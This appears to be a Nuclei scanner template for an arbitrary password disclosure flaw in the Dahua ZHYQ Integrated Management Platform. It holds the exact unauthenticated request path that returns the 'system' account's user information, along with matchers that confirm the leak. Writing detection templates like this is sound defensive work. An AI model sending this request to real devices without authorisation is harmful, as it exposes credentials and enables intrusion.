id: dahua-zhyq-password-disclosure
info:
  name: Dahua ZHYQ Arbitrary Password Disclosure
  author: ProjectDiscoveryAI
  severity: high
  tags: password-disclosure
  description: |
    An arbitrary password disclosure vulnerability exists in the Dahua ZHYQ Integrated Management Platform, allowing attackers to retrieve sensitive information.

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/user_getUserInfoByUserName.action?userName=system"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "loginName"
          - "isReuse"
          - "system"
          - "f91b1ba2c0287e102527f53805656046"
      - type: word
        part: header
        words:
          - "text/html;charset=UTF-8"
